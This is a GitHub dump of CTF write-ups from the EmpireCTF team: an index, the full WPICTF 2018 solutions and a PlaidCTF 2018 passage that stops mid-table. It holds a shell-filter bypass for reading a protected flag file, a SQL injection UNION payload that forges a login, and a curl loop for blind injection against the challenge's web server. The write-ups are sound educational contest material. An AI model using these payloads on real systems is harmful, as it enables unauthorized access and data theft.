{"source": "github", "repo": "Aurel300/empirectf", "file": "README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/README.md", "content": "## CTF write-ups ##\n\n**Continuous**\n\n - [OverTheWire-Bandit](writeups/OverTheWire-Bandit/README.md)\n - [OverTheWire-Natas](writeups/OverTheWire-Natas/README.md)\n\n**2025**\n\n - [2025-06-14-smileyCTF](writeups/2025-06-14-smileyCTF/README.md)\n\n**2021**\n\n - [2021-07-17-Google-CTF](writeups/2021-07-17-Google-CTF/README.md)\n\n**2020**\n\n - [2020-08-22-Google-CTF](writeups/2020-08-22-Google-CTF/README.md)\n\n**2019**\n\n - [2019-04-02-encryptCTF](writeups/2019-04-02-encryptCTF/README.md)\n - [2019-03-29-VolgaCTF-Quals](writeups/2019-03-29-VolgaCTF-Quals/README.md)\n - [2019-03-23-0CTF-CTF-Quals](writeups/2019-03-23-0CTF-CTF-Quals/README.md)\n - [2019-03-09-HECCTF](writeups/2019-03-09-HECCTF/README.md)\n - [2019-02-01-nullcon-HackIM](writeups/2019-02-01-nullcon-HackIM/README.md)\n - [2019-01-19-Insomni-Hack-Teaser](writeups/2019-01-19-Insomni-Hack-Teaser/README.md)\n\n**2018**\n\n - [2018-12-27-35C3-CTF](writeups/2018-12-27-35C3-CTF/README.md)\n - [2018-10-26-P-W-N-CTF](writeups/2018-10-26-P-W-N-CTF/README.md)\n - [2018-10-20-HITCON-CTF](writeups/2018-10-20-HITCON-CTF/README.md)\n - [2018-10-05-Hackover-CTF](writeups/2018-10-05-Hackover-CTF/README.md)\n - [2018-09-29-Teaser-Dragon-CTF](writeups/2018-09-29-Teaser-Dragon-CTF/README.md)\n - [2018-09-14-CSAW-CTF-Quals](writeups/2018-09-14-CSAW-CTF-Quals/README.md)\n - [2018-09-08-HackIT-CTF](writeups/2018-09-08-HackIT-CTF/README.md)\n - [2018-09-01-TokyoWesterners-CTF](writeups/2018-09-01-TokyoWesterners-CTF/README.md)\n - [2018-07-28-Real-World-CTF-Quals](writeups/2018-07-28-Real-World-CTF-Quals/README.md)\n - [2018-06-23-Google-CTF-Quals](writeups/2018-06-23-Google-CTF-Quals/README.md)\n - [2018-06-19-SCTF](writeups/2018-06-19-SCTF/README.md)\n - [2018-05-31-SecurityFest](writeups/2018-05-31-SecurityFest/README.md)\n - [2018-05-26-SUCTF](writeups/2018-05-26-SUCTF/README.md)\n - [2018-05-19-RCTF](writeups/2018-05-19-RCTF/README.md)\n - [2018-05-12-DEF-CON-CTF-Qualifier](writeups/2018-05-12-DEF-CON-CTF-Qualifier/README.md)\n - [2018-05-05-PlaidCTF](writeups/2018-05-05-PlaidCTF/README.md)\n - [2018-04-13-WPICTF](writeups/2018-04-13-WPICTF/README.md)\n", "timestamp": "2025-10-24T11:38:49.650809"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-04-13-WPICTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-04-13-WPICTF/README.md", "content": "# 2018-04-13-WPICTF #\n\n[CTFTime link](https://ctftime.org/event/600) | [Website](https://wpictf.xyz/)\n\n---\n\n## Challenges ##\n\n### pwn ###\n\n - [ ] 100 ezpz\n - [x] [150 Shell-JAIL-1](#pwn--150-shell-jail-1)\n - [ ] 200 Forker.1\n - [x] [250 Shell-JAIL-2](#pwn--250-shell-jail-2)\n - [ ] 300 Breakingout\n - [ ] 300 Forker.2\n - [ ] 500 Forker.3\n - [ ] 750 Forker.4\n\n### Forensics ###\n\n - [ ] 200 Big Guy\n - [ ] 400 jay-peg\n\n### Web ###\n\n - [x] [150 Dance](#web--150-dance)\n - [x] [200 Vault](#web--200-vault)\n\n### Crypto ###\n\n - [ ] 200 guess5\n\n### Reversing ###\n\n - [x] [50 Penguin](#reversing--50-penguin)\n - [ ] 150 kerning\n\n### Misc ###\n\n - [x] [1 Read](#misc--1-read)\n - [x] [2 Get a job](#misc--2-get-a-job)\n - [x] [5 Feedback](#misc--5-feedback)\n - [x] [10 Discord](#misc--10-discord)\n - [x] [50 Kittens](#misc--50-kittens)\n - [x] [100 Sneakers](#misc--100-sneakers)\n - [x] [100 Bitpuzzler](#misc--100-bitpuzzler)\n\n### Recon ###\n\n - [ ] 50 Window\n\n---\n\n## pwn / 150 Shell-JAIL-1 ##\n\n**Files provided**\n\n> login (SSH key, not disclosed)\n\n**Description**\n\n> Download the login private key, then run:\n> \n> ssh -p 31337 -i login shjail@shelljail1.wpictf.xyz\n> \n> redundant servers on 31338 and 31339\n> \n> made by Ben Chaney\n\n**Solution**\n\nAfter logging in, we are put immediately into `/home/pc_owner`, on a very restricted machine:\n\n    $ whoami\n    shjail\n\n    $ touch /tmp/file\n    touch: /tmp/file: Read-only file system\n\nEverything else is read-only.\n\n    $ ls -al\n    total 28\n    drwxr-xr-x    1 pc_owner pc_owner      4096 Apr 13 08:03 .\n    drwxr-xr-x    1 root     root          4096 Apr 13 08:03 ..\n    -r-sr-sr-x    1 pc_owner pc_owner     10880 Apr 13 08:03 access\n    -r--r--r--    1 pc_owner pc_owner      1005 Apr 13 04:50 access.c\n    -r--r-----    1 pc_owner pc_owner        23 Apr 13 04:50 flag.txt\n\nThere is an executable, `access`, with the `setuid` bit set. `access.c` is the source code for `access`, and `flag.txt` is our target. Clearly we need to use `access` to read `flag.txt` somehow.\n\n    $ cat access.c\n    /* ... */\n    int filter(const char *cmd){\n      int valid = 1;\n      valid &= strstr(cmd, \"*\") == NULL;\n      valid &= strstr(cmd, \"sh\") == NULL;\n      valid &= strstr(cmd, \"/\") == NULL;\n      valid &= strstr(cmd, \"home\") == NULL;\n      valid &= strstr(cmd, \"pc_owner\") == NULL;\n      valid &= strstr(cmd, \"flag\") == NULL;\n      valid &= strstr(cmd, \"txt\") == NULL;\n      return valid;\n    }\n    \n    int main(int argc, const char **argv){\n      setreuid(UID, UID);\n      char *cmd = gen_cmd(argc, argv);\n      if (!filter(cmd)){\n        exit(-1);\n      }\n      system(cmd);\n    }\n\nThe executable runs whatever arguments we give it as the `pc_owner` user. However, many substrings are forbidden, including `flag`, so we can't just `cat flag.txt`. `*`, the basic wildcard in shell globbing is forbidden also. Luckily, there is another wildcard: [the `?` wildcard](http://www.tldp.org/LDP/abs/html/special-chars.html#WILDCARDQU), which stands for any single character. So:\n\n    $ ./access \"cat fl?g.t?t\"\n    wpi{MaNY_WayS_T0_r3Ad}\n\n---\n\n## pwn / 250 Shell-JAIL-2 ##\n\n**Files provided**\n\n> login (SSH key, not disclosed)\n\n**Description**\n\n> Download the login private key, then run:\n> \n> ssh -p 31337 -i login shjail@shelljail2.wpictf.xyz\n> \n> redundant servers on 31338 and 31339\n> \n> made by Ben Chaney\n\n**Solution**\n\nSame set up as the previous challenge, with one significant difference in `main`:\n\n    int main(int argc, const char **argv){\n      setreuid(UID, UID);\n      char *cmd = gen_cmd(argc, argv);\n      if (!filter(cmd)){\n        exit(-1);\n      }\n      setenv(\"PATH\", \"\", 1); \n      system(cmd);\n    }\n\nThe `PATH` environment variable is cleared, so `cat` will not work anymore. We will have to use one of the [shell builtins](https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html). Here is a simple method:\n\n    $ ./access \"source fl?g.t?t\"\n    sh: flag.txt: line 1: wpi{p0s1x_sh3Lls_ar3_w13rD}: not found\n\nThis attempts to parse `flag.txt` as a shell script, which naturally fails. Luckily, the error message prints out the flag for us.\n\n---\n\n## Web / 150 Dance ##\n\n**No files provided**\n\n**Description**\n\n> https://dance.wpictf.xyz\n> \n> by binam\n\n**Solution**\n\nNavigating to the URL in a browser immediately redirects us to [this helpful video](https://www.youtube.com/watch?v=dQw4w9WgXcQ#t=0m09s). After taking some inspiration from the video, we attempt a non-browser approach:\n\n    $ curl \"https://dance.wpictf.xyz\"\n    <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n    <title>Redirecting...</title>\n    <h1>Redirecting...</h1>\n    <p>You should be redirected automatically to target URL: <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ#t=0m09s\">https://www.youtube.com/watch?v=dQw4w9WgXcQ#t=0m09s</a>.  If not click the link.\n\nStill not terribly useful. Let's enable verbose mode for `curl`:\n\n    $ curl -v https://dance.wpictf.xyz\n    > GET / HTTP/1.1\n    ...\n    > \n    < HTTP/1.1 302 FOUND\n    * Server nginx/1.13.12 is not blacklisted\n    < Server: nginx/1.13.12\n    < Date: Sun, 15 Apr 2018 19:35:02 GMT\n    < Content-Type: text/html; charset=utf-8\n    < Content-Length: 309\n    < Connection: keep-alive\n    < Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ#t=0m09s\n    < Set-Cookie: flag=E1KSn2SSktOcG2AeV3WdUQAoj24fm19xVGmomMSoH3SuHEAuG2WxHDuSIF5wIGW9MZx=; Path=/\n    < Set-Cookie: Julius C.=\"got good dance moves.\"; Path=/\n    < Strict-Transport-Security: max-age=31536000\n    < \n    <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n    <title>Redirecting...</title>\n    ...\n\nTwo cookies are given:\n\n> `flag=E1KSn2SSktOcG2AeV3WdUQAoj24fm19xVGmomMSoH3SuHEAuG2WxHDuSIF5wIGW9MZx=`\n\nThis should be our flag. It looks like base64, but it produces garbage after decoding.\n\n> `Julius C.=\"got good dance moves.\"`\n\nJulius C. here is a hint / reference to Julius Caesar, and hence the [Caesar cipher](https://en.wikipedia.org/wiki/Caesar_cipher). This cipher applies to letters and leaves numbers and other data intact. Applying it to the decoded flag data is not much use (mostly binary data). So we try to apply the shift with all 25 keys to the base64 string itself:\n\n    #!/usr/bin/env python\n    import base64, string\n    flag = \"E1KSn2SSktOcG2AeV3WdUQAoj24fm19xVGmomMSoH3SuHEAuG2WxHDuSIF5wIGW9MZx=\"\n    upper = string.ascii_uppercase\n    lower = string.ascii_lowercase\n    for key in range(1, 26):\n        shift = string.maketrans(\n            upper + lower,\n            upper[key:] + upper[:key] + lower[key:] + lower[:key])\n        print key, base64.b64decode(string.translate(flag, shift))\n\n> [link to script](scripts/web-150-dance-shift.py)\n\n(Or use a website like [this](https://www.xarg.org/tools/caesar-cipher/).)\n\nAnd, sure enough, with a key of 17, we get:\n\n    WPI{bInAm_do3sn,t_kn0w_h1w_t2_creaTe_chaIIenges}\n\n---\n\n## Web / 200 Vault ##\n\n**No files provided**\n\n**Description**\n\n> https://vault.wpictf.xyz\n> \n> UPDATE: everything fixed\n> \n> by GODeva\n\n**Solution**\n\n<p align=\"center\"><img src=\"screens/web-200-vault1.png\" alt=\"\" /></p>\n\nWe are greeted with a login screen. The page sourcecode has two interesting comments:\n\n    <!-- Welcome to the the Fuller Vault\n    - clients/clients.db stores authentication info with the following schema:\n    \n    CREATE TABLE clients (\n      id VARCHAR(255) PRIMARY KEY AUTOINCREMENT,\n      clientname VARCHAR(255),\n      hash VARCHAR(255),\n      salt VARCHAR(255)\n    ); -->\n\nWe are given the full schema for the `clients` table, so it is pretty clear we will be dealing with a SQL injection of some sort. The other comment:\n\n    <!-- V2hhdD8gWW91IHRob3VnaHQgdGhpcyB3YXMgYSBmbGFnPyBIYSB0aGF0IHdvdWxkIGJlIHRvIGVhc3kuIFRoYXQncyBqdXN0IG5vdCBteSBzdHlsZT8gfiBHb3V0aGFt -->\n\n    $ echo \"V2hhdD8gWW91IHRob3VnaHQgdGhpcyB3YXMgYSBmbGFnPyBIYSB0aGF0IHdvdWxkIGJlIHRvIGVhc3kuIFRoYXQncyBqdXN0IG5vdCBteSBzdHlsZT8gfiBHb3V0aGFt\" | base64 -D\n    What? You thought this was a flag? Ha that would be to easy. That's just not my style? ~ Goutham\n\nSo just a red herring. The register button links to [this useful video](https://www.youtube.com/watch?v=dQw4w9WgXcQ). Let's try putting some data in the form.\n\n> Username: '\n> Password: x\n\n<p align=\"center\"><img src=\"screens/web-200-vault2.png\" alt=\"\" /></p>\n\nVery useful! We can even expand the last entry in the traceback to see the surrounding code:\n\n> File \"/home/vault/vault/secretvault.py\", line 58, in login\n>     connection = sqlite3.connect(os.path.join(directoryFordata, 'clients.db'))\n>     pointer = connection.cursor()\n>  \n>     search = \"\"\"SELECT id, hash, salt FROM clients\n>                WHERE clientname = '{0}' LIMIT 1\"\"\".format(clientname)\n>     pointer.execute(search)\n>  \n>     res = pointer.fetchone()\n>     if not res:\n>         return \"No such user in the database {0}!\\n\".format(clientname)\n>     userID, hash, salt = res\n\nVery clear SQL injection vulnerability. Unfortunately, it looks like the server first selects a row from the table based on `clientname`, then checks the `hash` + `salt` at a later point. No problem, we can use a SQL `UNION` statement to make our own login credentials. We make an informed guess that the hashing algorithm is SHA-256. It is not clear whether the salt is appended or prepended, so let's just not have any. We can find out the SHA-256 hash of a password of our choosing easily:\n\n    $ python -c 'from hashlib import sha256; print sha256(\"foobar\").hexdigest()'\n    c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2\n\nThe full data that we'd like to have in the table is:\n\n| `id` | `hash` | `salt` |\n| --- | --- | --- |\n| \"0\" | \"c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2\" | \"\" |\n\nWe'll get to `id` later, so we put 0 for now (but the column type is still `VARCHAR(255)`). Knowing the query the server executes, we construct the following injection:\n\n    ' UNION SELECT \"0\", \"c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2\", \"\" -- \n\nSo after Python formats the query string, the result is:\n\n    SELECT id, hash, salt FROM clients WHERE clientname = ''\n    UNION\n    SELECT \"0\", \"c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2\", \"\"\n\n(Everything after is ignored due to the comment marker ` -- `.)\n\nIn other words, the server is looking for clients with `clientname` equal to the empty string, and concatenates the (non-existent) results of that query with our inline data.\n\nTo login:\n\n> Username: ' UNION SELECT \"0\", \"c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2\", \"\" -- \n> Password: foobar\n\nIt works, and we are greeted with the message:\n\n    Welcome back valid user! Your digital secret is: \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" (Log out)\n\nI'll let you guess what that video is. There is nothing else we can change in our login except for the `id` - it seems the server serves different \"digital secrets\" based on the `id` of the logged-in user. We can figure out the `id` for user `Goutham`, since the red herring comment hinted that `Goutham` knows the flag. Given that `id` is a `VARCHAR(255)`, the search space could be quite large, and we could use a character-by-character binary search. Luckily, it is a single digit.\n\n    #!/bin/bash\n    for id in {0..9}; do\n        echo \"$id\"\n        curl --data-urlencode \"clientname=Goutham' AND id = '$id' -- \" \\\n            --data-urlencode \"password=a\" \"https://vault.wpictf.xyz/login\"\n    done\n\n> [link to script](scripts/web-200-vault-getid.sh)\n\nThe above script injects the additional condition for `id` value into the SQL query. Only when both `clientname` and `id` match a record in the table will a row be found in the result. We can distinguish the two cases based on the different error messages produces (\"no such user\" vs. \"incorrect password\"). So we find out that `Goutham` has `id` \"2\".\n\n> Username: ' UNION SELECT \"2\", \"c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2\", \"\" -- \n> Password: foobar\n\nAnd that works:\n\n    Welcome back valid user! Your digital secret is: \"WPI{y0ur_fl46_h45_l1k3ly_b31n6_c0mpr0m153d}\" (Log out)\n\n---\n\n## Reversing / 50 Penguin ##\n\n**Files provided**\n\n> [`penguin`](files/50-penguin) (binary file)\n\n**Description**\n\n> made by awg\n\n**Solution**\n\nThis challenge asks us to give it the flag in the argument and it tells us whether or not it is the correct flag. There are some interesting strings to be found:\n\n    $ strings penguin\n    ...\n    _hexedit}\n    _fly._\n    learn_\n    have_\n    _still_\n    _wings,_\n    gives_\n    only_\n    strings_\n    WPI{\n    ...\n\nUseful, but `WPI{strings_only_gives__wings,__still_have_learn__fly.__hexedit}` is not the flag. Clearly something is missing. If we do a hexdump, we can locate the strings found:\n\n    $ xxd penguin\n    ...\n    0000a20: 6974 2100 5752 4f4e 4700 5f68 6578 6564  it!.WRONG._hexed\n    0000a30: 6974 7d00 7472 7900 5f66 6c79 2e5f 005f  it}.try._fly._._\n    0000a40: 746f 0068 6f77 006c 6561 726e 5f00 746f  to.how.learn_.to\n    0000a50: 5f00 6861 7665 5f00 5f73 7469 6c6c 5f00  _.have_._still_.\n    0000a60: 796f 7500 5f77 696e 6773 2c5f 0067 6976  you._wings,_.giv\n    0000a70: 6573 5f00 6f6e 6c79 5f00 7374 7269 6e67  es_.only_.string\n    0000a80: 735f 0057 5049 7b00 011b 033b 3c00 0000  s_.WPI{....;<...\n    ...\n\nSo, with some intense word reading in reverse and guessing based on consecutive underscores in our initial guess, we get:\n\n    WPI{strings_only_gives_you_wings,_you_still_have_to_learn_how_to_fly._try_hexedit}\n\n> Note: The challenge was solved using `radare2`, but I like to think this method was plausible. And more importantly, I did not want to get into annotating the lenghty, visual-heavy process of debugging a binary with `radare2`.\n\n---\n\n## Misc / 1 Read ##\n\n**No files provided**\n\n**Description**\n\n> WPI{Hey_You_can_R3AD!}\n\n**Solution**\n\n...\n\n---\n\n## Misc / 2 Get a job ##\n\n**No files provided**\n\n**Description**\n\n> WPI{Get_a_job}\n\n**Solution**\n\n...\n\n> Note: the text in the description was a link to a careers page of some company. Unfortunately, I don't have the link URL anymore.\n\n---\n\n## Misc / 5 Feedback ##\n\n> Note: this was a link to a survey, which gave the flag.\n\n---\n\n## Misc / 10 Discord ##\n\n**No files provided**\n\n**Description**\n\n> (discord link)\n> \n> Flag is somewhere in discord. /flag bot does not reply to messages. It's only there for kittens.\n\n**Solution**\n\nThe topic of the `#discord_chal` channel was `WPI{Welcome_to_Disc0rd_ya-D00fus} is the flag for the discord challenge.`\n\n## Misc / 50 Kittens ##\n\n**No files provided**\n\n**Description**\n\n> discord\n> \n> created by binam\n> \n> this challenge is stupid\n\n**Solution**\n\nThe `#discord_chal` channel had a bot which responded to `flag` in messages:\n\n    [1:00 PM] User: flag\n    [1:00 PM] BOT/flag: @User, Every time you type \"flag\", a kitten dies! You killed 1 kittens. Total dead kitten count: 100\n\nPutting hundreds of `flag` in one message was allowed. After 65535, the counter overflowed, and the bot printed a flag for the user. However, the message with the flag was automatically removed after a short while.\n\n## Misc / 100 Sneakers ##\n\n**No files provided**\n\n**Description**\n\n> nc sneakers.wpictf.xyz 31337\n> \n> redundant servers on 31338 and 31339\n> \n> made by rm -k\n> \n> Hint: ?v=F5bAa6gFvLs\n\n**Solution**\n\nThe hint is for [this video](https://www.youtube.com/watch?v=F5bAa6gFvLs).\n\nAfter `nc sneakers.wpictf.xyz 31337`, we are greeted with a big block of 1's and 0's:\n\n    00  01  10  10  11  10  11  10  00  01  10  00  01  10  10  00  10  10  10  01  \n    00  11  01  10  00  01  00  01  00  11  01  00  11  11  01  00  10  11  00  10  \n    01  01  00  10  00  10  10  00  00  10  10  00  10  00  00  00  00  10  00  00  \n\n    10  10  10  00  01  10  10  11  01  11  10  10  00  00  00  01  00  10  10  00  \n    10  10  01  00  11  01  11  00  10  01  00  10  11  00  00  10  00  10  10  00  \n    10  10  00  00  10  00  10  10  00  10  00  10  10  00  01  00  10  10  10  00  \n\n    10  11  10  11  00  11  01  10  10  00  11  10  10  00  01  10  10  00  11  10  \n    01  01  10  01  00  11  10  10  01  00  01  01  00  00  11  11  01  00  10  10  \n    10  10  10  11  00  00  00  11  00  00  11  10  11  00  10  00  00  00  00  10  \n\n    10  11  00  01  11  00  11  10  10  00  11  10  11  00  11  10  10  10  10  00  \n    00  11  00  10  10  00  01  01  00  00  00  00  01  00  10  11  01  10  01  00  \n    00  00  00  00  00  00  11  10  11  00  00  00  10  00  10  10  10  11  00  00  \n\n    01  10  10  01  00  11  10  10  00  10  10  10  00  10  01  01  10  10  10  10  \n    11  11  00  11  00  01  01  00  00  00  11  01  00  10  10  10  00  00  10  10  \n    10  00  00  10  00  11  10  11  00  00  10  00  00  11  00  10  11  00  10  10  \n\n    11  00  01  11  11  10  01  10  10  11  00  00  00  11  10  10  10  01  10  00  \n    01  00  10  00  10  00  10  11  01  01  11  00  00  10  10  01  00  10  01  00  \n    11  00  00  10  10  00  00  10  00  00  01  00  01  10  10  00  00  10  00  00  \n\n    01  11  11  10  00  00  11  10  11  01  01  11  10  10  00  00  01  11  00  10  \n    11  01  10  01  00  00  00  01  01  11  10  01  00  01  00  00  10  01  00  10  \n    10  11  10  00  00  10  00  10  10  10  00  10  11  00  10  00  00  10  00  00  \n\n    10  10  01  10  10  10  00  01  10  00  10  10  11  01  11  00  00  00  10  10  \n    11  00  10  10  10  01  00  11  01  00  10  01  11  10  01  11  00  00  11  01  \n    10  00  00  10  10  00  00  10  10  00  00  00  00  00  10  01  00  01  00  10  \n\n    01  00  01  10  00  01  10  01  01  10  00  10  00  10  10  01  11  10  11  01  \n    11  00  11  01  00  11  11  10  11  01  00  00  00  11  01  10  10  01  01  10  \n    01  00  10  10  00  01  10  00  10  00  00  00  00  10  00  10  10  10  10  10  \n\n    10  00  00  00  01  10  01  01  10  00  10  10  11  10  00  10  10  01  00  10  \n    01  00  00  00  11  11  10  11  01  00  01  00  00  11  00  11  01  11  00  01  \n    00  11  00  01  01  10  00  10  00  00  00  00  00  00  00  10  10  01  00  10  \n\n    11  00  10  10  10  01  10  10  10  00  10  01  00  01  01  00  01  00  10  11  \n    10  00  10  11  00  10  10  10  01  00  00  10  00  01  11  00  10  00  00  01  \n    00  00  00  10  00  00  10  10  00  00  00  10  00  11  00  10  10  00  00  10  \n\n    11  00  01  10  00  01  00  00  01  10  10  11  00  11  10  10  11  10  00  10  \n    01  00  01  00  00  10  10  00  11  11  01  01  00  10  10  00  00  01  00  00  \n    00  00  11  00  10  10  00  00  10  00  00  10  00  10  10  00  00  00  00  00  \n\n    11  00  00  11  00  00  10  01  00  01  10  10  00  10  11  11  00  10  11  00  \n    01  00  00  00  00  00  00  11  00  11  11  01  00  01  01  01  00  01  10  00  \n    10  00  10  11  10  00  00  10  00  10  00  00  00  00  10  00  00  10  00  00  \n\n    01  10  10  00  10  10  01  00  00  00  01  10  01  01  00  11  10  10  11  01  \n    11  11  01  00  11  01  11  11  00  00  11  11  10  10  00  00  01  00  01  10  \n    10  00  00  00  10  10  01  01  00  01  10  00  00  10  00  10  00  00  10  10  \n\n    00  01  10  10  01  00  10  10  10  00  01  10  10  10  10  00  10  10  01  01  \n    00  11  11  00  11  00  00  10  10  00  11  11  11  01  01  00  11  01  11  10  \n    00  10  00  00  10  00  00  10  10  00  10  00  10  00  00  00  10  10  01  10  \n\n    00  10  10  10  00  01  10  01  01  01  10  11  00  10  11  00  10  00  01  01  \n    00  00  11  01  00  11  11  10  11  11  01  01  00  01  01  00  00  00  10  10  \n    00  00  10  00  00  01  10  00  10  10  00  10  00  10  10  00  00  00  10  00  \n\n    11  11  10  10  00  10  01  11  10  00  10  11  00  01  11  11  10  01  00  00  \n    01  11  10  01  00  10  10  01  01  00  01  10  00  10  01  10  00  11  10  00  \n    10  00  10  00  00  10  00  10  00  00  10  00  00  00  10  10  11  10  00  00  \n\n    01  11  00  01  10  10  00  11  10  10  11  00  00  00  00  11  00  00  00  11  \n    10  01  00  11  11  01  00  10  01  11  00  00  11  11  11  00  11  11  11  00  \n    00  10  00  10  00  00  00  00  10  10  10  00  01  01  01  11  01  01  01  11  \n\n    00  00  00  11  00  \n    11  11  11  00  11  \n    01  01  01  11  01  \n\nGiven the video which features a blind hacker using a Braille \"monitor\", it was quite clear these 1's and 0's represented Braille characters.\n\nAfter some automated deciphering:\n\n    Welcome to the brai\n    lle terminal! I'll \n    only give you the fl\n    ag if you can prove \n    that you are visuall\n    y impaired. Please \n    type 'continue' in b\n    raille to begin. Ho\n    w to write a respons\n    e- Write each row o\n    f braille as 0's an\n    d 1's, then place a\n    n 'x' at the end of \n    the row. This means\n     that all three rows\n     are written on a si\n    ngle line of input, \n    in the form ...x...x\n\nThe individual parts of the challenge asked to:\n\n - type `continue`\n - solve a simple mathematical problem and give the numerical solution\n - type `ACCESS FLAG!`\n - type `please`\n\nThe final `please` was a response to the server saying \"Ah ah ah, you didn't say the magic word!\", and referencing [this video](https://www.youtube.com/watch?v=RfiQYRn7fBg).\n\n## Misc / 100 Bitpuzzler ##\n\n**No files provided**\n\n**Description**\n\n> nc bitpuzzler.wpictf.xyz 31337\n> \n> redundant servers on 31338 and 31339\n> \n> made Jacob Henry\n\n**Solution**\n\nConnecting to the given server results in it printing something like:\n\n    -----\n    #include <stdlib.h>\n    #include <stdio.h>\n    #include <stdint.h>\n\n    inline int64_t pmod(int64_t x) {\n      int64_t v = x % 13707217;\n      if(v < 0)\n        return v + 13707217;\n      else\n        return v;\n    }\n\n    int main(int argc, char** argv) {\n      int64_t x;\n      scanf(\"%ld\", &x);\n      x = pmod(x);\n      x = pmod(x - 2765383);\n      x = pmod(x - 11088075);\n      x = pmod(x + 53063);\n      // etc etc etc, for a total of 100 operations\n      x = pmod(x * 2486459);\n      x = pmod(x * 4797058);\n      x = pmod(x * 8426160);\n      if(x == 8594918) {\n        printf(\"Success\\n\");\n        return 0;\n      } else {\n        printf(\"Failure\\n\");\n        return 1;\n      }\n    }\n    -----\n\nWith different numbers every time. This challenge required some automation, since the server would automatically close the connection after 10 seconds. Furthermore, the server gives a dozen or two scripts like the above one after the other.\n\nThe automated solver is fairly simple. It requires reversing the operations from the target number and finding out the correct input. Addition and subtraction in modular arithmetic are very simple. The only slightly non-trivial operation to reverse is the multiplication, which requires solving a linear congruence equation (like `a * b === c mod m`, find `b` for a given `a`, `c`, and `m`). Checking each integer in the range `[1; m)` is just too slow, so the [Extended Euclidian algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm) was used.\n", "timestamp": "2025-10-24T11:38:50.819809"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-05-05-PlaidCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-05-05-PlaidCTF/README.md", "content": "# 2018-05-05-PlaidCTF #\n\n[CTFTime link](https://ctftime.org/event/617) | [Website](http://plaidctf.com/)\n\n---\n\n## Challenges ##\n\n > Note: only listing the one challenge that I haven't seen a write up for and where I made enough progress.\n\n### Misc ###\n\n - [ ] [200 Re: Plaid Party Planning](#misc--200-re-plaid-party-planning)\n\n---\n\n## Misc / 200 Re: Plaid Party Planning ##\n\n**No files provided**\n\n**Description**\n\n> Last year, we planned a party but had some issues with multiple people working at the same time. This year, we've improved communication, but everyone is far away. We need to find the best place to host the after-party minimizing total travel time. \n> \n> Note: All of the food needs to be picked up. \n> \n> Can you help? If so, please contact pppr.chal.pwning.xxx:3444.\n\n**Solution**\n\nAfter logging in, we get a question:\n\n    Would you like the condensed version? [y/N]\n\nNaturally, we start by reading the verbose version. The challenge is described like this:\n\n    You'll need to answer 141 queries about where we should hold our party.\n    For each query, please respond with the index of the city where the party should be held and the sum total travel time for everyone to get there (two space-separated integers). Please find the location that minimizes the total travel time for everyone. Note that the total travel time will be less than 10^18.\n    In this scenario, there are 12 cities, 14 bidirectional roads between them, and 4 people that are coming.\n    Here are where all the people are:\n    There is a person at city 11\n    There is a person at city 2\n    There is a person at city 0\n    There is a person at city 9\n    Every person also needs to pick up food from exactly one city on the way to the party. Here is a list of where all of the good food is:\n    There is good food at city 10\n    There is good food at city 3\n    There is good food at city 7\n    There is good food at city 2\n    Now, I'll tell you about the start city, end city, and travel time for each road.\n    There is a road that goes from 0 to 1 and takes 152 minutes to travel along.\n    There is a road that goes from 0 to 4 and takes 586 minutes to travel along.\n    There is a road that goes from 0 to 7 and takes 665 minutes to travel along.\n    There is a road that goes from 1 to 2 and takes 998 minutes to travel along.\n    There is a road that goes from 2 to 9 and takes 475 minutes to travel along.\n    There is a road that goes from 2 to 5 and takes 260 minutes to travel along.\n    There is a road that goes from 3 to 8 and takes 966 minutes to travel along.\n    There is a road that goes from 3 to 6 and takes 871 minutes to travel along.\n    There is a road that goes from 5 to 6 and takes 83 minutes to travel along.\n    There is a road that goes from 6 to 11 and takes 669 minutes to travel along.\n    There is a road that goes from 8 to 9 and takes 571 minutes to travel along.\n    There is a road that goes from 9 to 10 and takes 545 minutes to travel along.\n    There is a road that goes from 9 to 11 and takes 659 minutes to travel along.\n    There is a road that goes from 10 to 11 and takes 436 minutes to travel along.\n    Where should they hold the party, and how long will it take everyone to get there?\n\nAnd, while reading this, we also get a very quick timeout (~2 seconds):\n\n    You ran out of time\n\nThe \"condensed\" version for the above would read:\n\n    141\n    12 14 4\n    11\n    2\n    0\n    9\n    10\n    3\n    7\n    2\n    0 1 152\n    0 4 586\n    0 7 665\n    1 2 998\n    2 9 475\n    2 5 260\n    3 8 966\n    3 6 871\n    5 6 83\n    6 11 669\n    8 9 571\n    9 10 545\n    9 11 659\n    10 11 436\n\nNote that each query only sends a count of cities, roads, and people. The number of foods is the same as the number of people. I thought it wasn't immediately obvious, but the organisers quickly clarified on IRC and via the note you see in the descrition. So, each person needs to get one food, then head to the meeting city.\n\nA nice algorithmic question!\n\n### Algorithm description ###\n\nThe cities and roads form a weighted (non-directed) graph. We use Dijkstra's algorithm to work out the shortest path between each person to each food city. We also do this for each food. We know that all foods need to be collected, so part of our answer will be the sum of the journey distances from all food cities to the meeting point. For this we can simply check each city and sum up the distances from all the foods and keep track of the best (minimum distance) city.\n\nThe other part of the problem is to work out which person collects which food. This is more difficult, since the number of assignments for `n` people is `n!` (factorial). Even with 16 people this is an immense number of permutations to consider. Serious optimisation is required.\n\nWe first start with a trivial assignment of person 1 to food 1, person 2 to food 2, and so on.\n\n| | F1 | F2 | F3 | F4 |\n| --- | --- | --- | --- | --- |\n| P1 | (4) | 2 | 1 | 3 |\n| P2 | 4 | (4) | 1 | 3 |\n| P3 | 1 | 